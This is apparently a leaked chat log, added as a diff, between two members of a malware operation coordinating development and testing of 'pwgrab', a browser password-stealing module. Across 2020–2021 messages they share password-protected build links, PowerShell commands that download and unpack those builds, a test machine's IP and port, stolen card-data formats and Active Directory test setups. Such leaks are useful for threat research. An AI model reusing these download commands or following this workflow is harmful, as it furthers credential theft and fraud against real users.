@@ -1,0 +1,96 @@
+Timestamp	From	To	Message
+2020-07-17 14:18:33.784273	steller	kingston	привет. у тебя есть свободная машина для тестов?
+2020-07-20 09:42:16.382875	steller	kingston	привет.
+у тебя есть 10ка свободная для тестов?
+2020-07-24 07:28:29.812843	steller	kingston	привет. что-то случилось с 32018. можешь посмотреть?
+2020-07-27 14:33:38.015804	steller	kingston	не могу повторить удаление паролей. скинешь мне виртуалку?
+2020-07-28 08:11:38.347409	steller	kingston	привет. у тебя 32018 работает?
+2020-07-28 08:47:30.234495	kingston	steller	привет. у тебя 32018 работает?
+2020-07-28 14:23:25.926207	steller	kingston	привет.
+у тебя 32018 работает?
+2020-07-29 07:29:17.401738	steller	kingston	привет.
+опять 23018 подвисла.
+2020-07-31 07:20:19.112588	steller	kingston	привет. 31001 свободна?
+2020-07-31 13:11:39.098893	steller	kingston	держи. почищенная сборка pwgrab:
+g31.7.2020
+Dowload URL:
+https://file.io/eNooPd1ECvvh
+Pass:
+_DI|_nHN>p#w#x|T:CQG
+2020-08-03 11:18:11.479977	steller	kingston	попробовал с прокладками в архиве - нормально отправляется на 32004.
+а ты еще раз запускал?
+2020-08-04 07:59:52.003703	steller	kingston	Привет.
+Можешь напомнить, на чем падал модуль в боте?
+2020-08-07 08:23:14.640211	steller	kingston	Привет. 
+Занят? Попробуй логированную сборку pwgrab c ботом запустить. Будет ли отваливаться?
+Dowload URL:
+https://file.io/FU0hwvLP9VKB
+Pass:
+-qo$qQkROp-*k$dXL&<a
+Download command:
+powershell (new-object System.Net.WebClient).DownloadFile('https://file.io/FU0hw
+vLP9VKB', '1.rar') ; & "c:\Program files\WinRar\unrar.exe" x -p"-qo$qQkROp-*k$dX
+L&<a" 1.rar
+2020-08-11 09:56:39.442264	steller	kingston	привет. теряются сообщения.
+2020-08-17 14:27:35.136003	steller	kingston	Привет.
+У тебя есть свободная машина?
+2020-08-18 08:46:02.135111	steller	kingston	Привет.
+Помнишь, ты писал dpost-адреса нужно перемешивать?
+Сейчас битые адреса отправляются назад. Перемешивание оставлять?
+2020-08-20 12:16:10.331461	steller	kingston	У тебя 10ка есть свободная?
+2020-08-21 06:28:44.169147	steller	kingston	Привет. Не могу зайти на 31004
+2020-08-21 07:10:21.021374	steller	kingston	Привет. Не могу зайти на 31004
+2020-08-31 12:11:54.826906	steller	kingston	Привет.
+У тебя есть виртуалка с последней версией edge?
+2020-09-03 09:47:59.344758	steller	kingston	У тебя 10x64 свободная есть?
+2020-09-04 05:28:24.065944	steller	kingston	Привет.
+Новая версия pwgrab с поддержкой chromium edge / beta
+Тестил только промежуточные сборки. С edge собирает.
+g4.9.2020
+Dowload URL:
+https://file.io/w0YccIzfjCAL
+Pass:
+Ao*bOzc#SIw}2i:QH?(p
+Download command:
+powershell (new-object System.Net.WebClient).DownloadFile('https://file.io/w0Ycc
+IzfjCAL', '1.rar') ; & "c:\Program files\WinRar\unrar.exe" x -p"Ao*bOzc#SIw}2i:Q
+H?(p" 1.rar
+2020-09-04 07:13:16.360628	steller	kingston	Привет.
+Новая версия pwgrab с поддержкой chromium edge / beta
+Тестил только промежуточные сборки. С edge собирает.
+g4.9.2020
+Dowload URL:
+https://file.io/w0YccIzfjCAL
+Pass:
+Ao*bOzc#SIw}2i:QH?(p
+Download command:
+powershell (new-object System.Net.WebClient).DownloadFile('https://file.io/w0Ycc
+IzfjCAL', '1.rar') ; & "c:\Program files\WinRar\unrar.exe" x -p"Ao*bOzc#SIw}2i:Q
+H?(p" 1.rar
+2020-09-07 09:23:54.743854	steller	kingston	Привет. У тебя машина с edge есть свободная?
+2020-09-09 11:52:31.140091	steller	kingston	Привет.
+Ты знаешь что должно быть в инфе по карте вместо "01"?
+"{"01":[{"expdate":"01/2021","card_number":""
+2020-09-28 10:30:14.623105	steller	kingston	Привет. Я вернулся)
+У тебя 173.232.146.199:31004 свободна?
+2020-09-29 09:05:22.009633	steller	kingston	Привет. А у тебя есть машина в домене с AD для экпериментов?
+2020-09-30 07:52:13.427460	steller	kingston	Привет. А пароль у 32005 какой?
+2020-10-05 12:43:41.201403	steller	kingston	Привет. У тебя есть пару виртуалок для подключения к серверу AD?
+2020-10-06 12:32:27.769572	steller	kingston	Привет. У тебя 32018 свободна, которую стрикс настраивал?
+2021-03-22 06:07:11.279644	steller	kingston	Привет. Что-то писал в пятницу?
+2021-04-28 12:03:00.748055	steller	kingston	Привет. У тебя тоже не работает рокет?
+2021-09-16 06:04:26.224189	steller	kingston	Привет. Скинь ещё логи с 7x64. Там другие ошибки были.
+2021-09-16 07:24:58.829449	steller	kingston	Привет. Скинь ещё логи с 7x64. Там другие ошибки были.
+2021-09-16 09:24:22.063705	steller	kingston	Привет. Тут?
+2021-10-04 07:05:26.557802	steller	kingston	Привет.
+У тебя есть новые прокладки для pwgrab?
+2021-10-04 07:16:27.032737	steller	kingston	Привет.
+У тебя есть новые прокладки для pwgrab?
+2021-10-05 14:24:21.110134	steller	kingston	Привет. А кто из тестеров тут у нас есть?
+2021-10-06 09:03:39.843193	steller	kingston	Привет.
+У нас известно когда ракета заработает?
+2021-10-08 09:37:19.088936	steller	kingston	Тут?
+2021-10-08 10:23:00.543531	steller	kingston	Тест
+2021-10-12 11:10:25.458059	steller	kingston	Привет.
+2021-10-14 12:10:35.347951	steller	kingston	Привет.
+2021-10-15 07:56:55.861367	steller	kingston	Привет.
